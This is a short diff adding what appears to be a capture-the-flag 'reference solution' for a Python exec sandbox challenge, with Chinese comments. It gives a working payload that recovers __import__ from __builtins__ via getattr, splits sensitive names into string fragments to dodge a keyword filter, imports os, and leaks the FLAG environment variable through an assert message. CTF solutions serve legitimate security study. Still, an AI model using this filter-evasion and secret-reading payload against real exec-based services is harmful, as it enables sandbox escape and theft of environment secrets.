@@ -1,0 +1,6 @@
+参考解法（nc 连接后粘贴，输入经 exec 执行）：
+
+# __builtins__ 是 module，用 getattr 挖 __import__；
+# 所有敏感名拆拼接，assert 异常消息带出 flag
+O = getattr(globals()['__bu'+'iltins__'], '__i'+'mport__')('o'+'s')
+assert 0, O.__dict__['envi'+'ron']['F'+'LAG']
